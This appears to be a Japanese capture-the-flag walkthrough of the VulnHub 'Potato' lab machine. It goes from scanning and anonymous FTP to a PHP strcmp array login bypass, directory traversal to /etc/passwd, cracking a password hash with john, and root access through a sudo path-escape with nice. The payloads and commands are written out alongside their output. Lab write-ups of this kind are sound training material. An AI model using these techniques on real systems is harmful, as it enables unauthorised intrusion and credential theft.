1.自身のアドレスを調べる
```bash
ip a
```

2.PotatoマシンのIPアドレスを特定する
```bash
sudo netdiscover -i enp0s3 -r 192.168.56.0/24
```
```bash
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0b      2     120  Unknown vendor
 192.168.56.100  08:00:27:a7:b4:59      1      60  PCS Systemtechnik GmbH
 192.168.56.102  08:00:27:eb:7d:02      1      60  PCS Systemtechnik GmbH
```
56.100 ⇒　DHCP<br>
56.120　⇒　ターゲット

3.実験用ディレクトリ作成

```
mkdir vulnhub/potato
```
4.Potatoマシンに疎通確認、ポートスキャン
```bash
ping -c 4 192.168.56.102
```
```bash
sudo nmap -sC -sV -Pn -p- 192.168.56.102 -oN portscan_result.txt
```

| オプション　| 概要 | 
|---|---|
| -sC | デフォルトカテゴリのスクリプトでスキャン|
| -sV| ソフトウェア名とバージョン|
| -Pn | スキャン前に疎通確認をしない|
| -p-| 全ポートえお対象にする（０～６５５３５まで）|
| -oN | スキャンの結果を指定のファイルに出力|

```
# 出力結果
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Potato company
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
MAC Address: 08:00:27:EB:7D:02 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
22,80,2212の開放を確認

| ポート番号　| 概要 | 
|---|---|
| ２２ | SSH|
| ８０| HTTP|
| ２１１２ | FTP（proFTPD⇒AnonymousFTPでログイン可能）|

5.FTPサービスにアクセスする
```bash
ftp 192.168.56.102 2112
```
```bash
Connected to 192.168.56.102.
220 ProFTPD Server (Debian) [::ffff:192.168.56.102]
Name (192.168.56.102:user): anonymous       #### ユーザー名入力「anonymous」
331 Anonymous login ok, send your complete email address as your password
Password: 　　　　　　　　　　　　　　　　　　　#### パスワード入力　適当でいい
230-Welcome, archive user anonymous@192.168.56.101 !
230-
230-The local time is: Sat Jul 04 22:00:46 2026
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
```
### 今回抑えておくコマンド

| command　| 概要 | 
|---|---|
| dir | ファイル一覧を表示|
| ls| 同上|
| exit | 接続終了|
| get | ファイルダウンロード|
| put | ファイルアップロード|
| mget | 複数ファイルダウンロード|
| mput | 複数ファイルアップロード|
| help| ヘルプを表示|

6.ファイルをダウンロードする

今回は２つしかなかったのでまとめてダウンロードした
```bash
mget *
```

7.ダウンロードしたファイルを調べる
```bash
#　ファイルの種類
$file welcome.msg
welcome.msg: ASCII text

# 中身
$cat welcome.msg
Welcome, archive user %U@%R !

The local time is: %T
```
```bash
$file index.php.bak
index.php.bak: HTML document, ASCII text

###
 $cat index.php.bak
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```
8.HTTPサービスにアクセスする

<img width="998" height="504" alt="image" src="https://github.com/user-attachments/assets/2bdd8363-9dc7-42d3-94a6-121a02cdfdc7" />

9.アクセスできるファイルを列挙する
```bash
gobuster dir -u 192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
```
```
##結果
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.102
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://192.168.56.102/admin/]
/index.php            (Status: 200) [Size: 245]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
```
/admin を見つけたのでアクセスする

```
192.168.56.102/admin
```
<img width="567" height="305" alt="image" src="https://github.com/user-attachments/assets/bce2fb75-790a-4671-b4d1-b0e3ca825365" />

10.ソースの認証部分を読む
```
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
```
strcmp()関数は２つの文字列を比較する<br>
PHPのstrcmp1()関数は、配列を指定すると使用上のエラーが発生してNULLを返す<br>
➢　$_POST['password`]を配列にすれば、strcmp($_POST[password],$pass)はNULLを返す
➢　PHPには「NULL==0」が真（Trrue）になるという、比較における固有の弱点がある
➢　uesrnameに「admin」、paswordに空の配列をセットすればダッシュボードにアクセスできる？？

11.Burpを使う

「アプリケーション」＞「Pentesting」＞「Web Application Analysis」＞「Web Application Proxies」>「Burp suite Community Edition」

<img width="743" height="186" alt="image" src="https://github.com/user-attachments/assets/7c8ac293-611e-42c8-9a5e-383f2b81481e" /><br>
・[Proxy]>[Intercept]>intercept on > open browser<br>
・ユーザー名「admin」パスワード「test」で試してみる<br>

<img width="1336" height="818" alt="image" src="https://github.com/user-attachments/assets/4eaa0a57-47bc-4a47-ad6b-a2d6a4d0efb8" />

POSTリクエストの「RAｗ」を変更する
```
username=admin&password=test
↓
username=admin&password[]=test
```

<img width="316" height="179" alt="image" src="https://github.com/user-attachments/assets/a012f871-d05f-46fb-be49-a45872b621dd" /><br>

12.ディレクトリラバーサル攻撃を仕掛けてみる

<img width="611" height="497" alt="image" src="https://github.com/user-attachments/assets/c5e6cda7-db2d-46f7-a001-171c4a4b2ce5" /><br>

・「Get the log」を押したあと、POSTリクエストの中身を変える
```
file=log_01.txt
↓
file=../../../../../etc/passwd
```
```
#　結果
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```
13.パスワードを解析する

passwdファイルにはパスワードハッシュをもつユーザーがいるのでこれでパスワード解析をする
```bash
cat > pass.txt

さっきのpasswdファイルの結果を張り付ける
```
・bashだけを抽出する
```bash
$cat pass.txt | grep -P 'sh$'

###結果
root:x:0:0:root:/root:/bin/bash
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```
・パスワードハッシュファイルを作成する
```bash
cat pass.txt | grep -P 'sh$' | grep webadmin > hash.txt
```
```
 $cat hash.txt
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```
・オフラインパスワードクラッカーを使用する
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
```
＃結果
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (webadmin)　　←　これがパスワード
1g 0:00:00:00 DONE (2026-07-05 10:18) 9.090g/s 3490p/s 3490c/s 3490C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
14.SSH接続をしてみる
```bash
ssh webadmin@192.168.56.102
```
#password⇒　dragon

15.探索
```bash
webadmin@serv:~$ id
uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
webadmin@serv:~$ pwd
/home/webadmin
webadmin@serv:~$ ls
user.txt
webadmin@serv:~$ ls -ltr
total 4
-rw------- 1 webadmin root 69 Aug  2  2020 user.txt
webadmin@serv:~$ ls -ltra
total 32
drwxr-xr-x 4 root     root     4096 Aug  2  2020 ..
-rw-r--r-- 1 webadmin webadmin  807 Aug  2  2020 .profile
-rw-r--r-- 1 webadmin webadmin 3771 Aug  2  2020 .bashrc
-rw-r--r-- 1 webadmin webadmin  220 Aug  2  2020 .bash_logout
drwx------ 2 webadmin webadmin 4096 Aug  2  2020 .cache
-rw------- 1 webadmin webadmin  357 Aug  2  2020 .bash_history
-rw------- 1 webadmin root       69 Aug  2  2020 user.txt
drwxr-xr-x 3 webadmin webadmin 4096 Aug  2  2020 .
webadmin@serv:~$ cat user.txt
TGUgY29udHLDtGxlIGVzdCDDoCBwZXUgcHLDqHMgYXVzc2kgcsOpZWwgcXXigJl1bmUg
webadmin@serv:~$ cd ..　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　←　ディレクトリをかえてみる
webadmin@serv:/home$ ls
florianges  webadmin
webadmin@serv:/home$ cd florianges
webadmin@serv:/home/florianges$ ls
webadmin@serv:/home/florianges$ ls -la
total 28
drwxr-xr-x 3 florianges florianges 4096 Aug  2  2020 .
drwxr-xr-x 4 root       root       4096 Aug  2  2020 ..
-rw------- 1 florianges florianges   38 Aug  2  2020 .bash_history
-rw-r--r-- 1 florianges florianges  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 florianges florianges 3771 Feb 25  2020 .bashrc
drwx------ 2 florianges florianges 4096 Aug  2  2020 .cache
-rw-r--r-- 1 florianges florianges  807 Feb 25  2020 .profile
-rw-r--r-- 1 florianges florianges    0 Aug  2  2020 .sudo_as_admin_successful ←　ここに注目！！！
```
16.sudoの設定確認

Webadminユーザーがsudoで何ができるかを調べる
```bash
[sudo] password for webadmin:
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*  ←　見るのはこれ
```
# /bin/nice/notes以下すべてのコマンドが実行できる（notes配下には大したものはない）

ncieコマンドを利用してどうにかbashにたどり着くようにするには
```bash
sudo /bin/nice /notes/../bin/bash
```
```
＃　結果
root@serv:/home/florianges#
```

17.ルート権限を取得できたのでフラグを探す
```
cd /root
```
```
root@serv:~# ls
root.txt  snap
root@serv:~# cat root.txt
bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==
```
・発見したエンコード文字列をデコードする
```bash
root@serv:~# cat root.txt | base64 -d
```
```
licorne unijambiste qui fuit au bout d’un double arc-en-ciel.
```

